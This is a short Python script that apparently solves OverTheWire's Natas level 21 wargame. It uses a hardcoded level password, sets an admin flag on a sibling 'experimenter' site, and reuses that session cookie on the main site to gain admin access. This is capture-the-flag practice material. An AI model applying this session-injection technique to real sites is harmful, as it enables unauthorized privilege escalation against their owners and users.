#!/usr/bin/python

import requests


username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

auth = (username, password)

url1 = "http://natas21.natas.labs.overthewire.org/"
url2 = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=true"


req2 = requests.get(url2, auth = auth, params = {'submit' : 'true','admin' : 1})


cook = req2.cookies['PHPSESSID']


req1 = requests.get(url1, auth = auth, cookies = {'PHPSESSID' : cook})


print req1.text
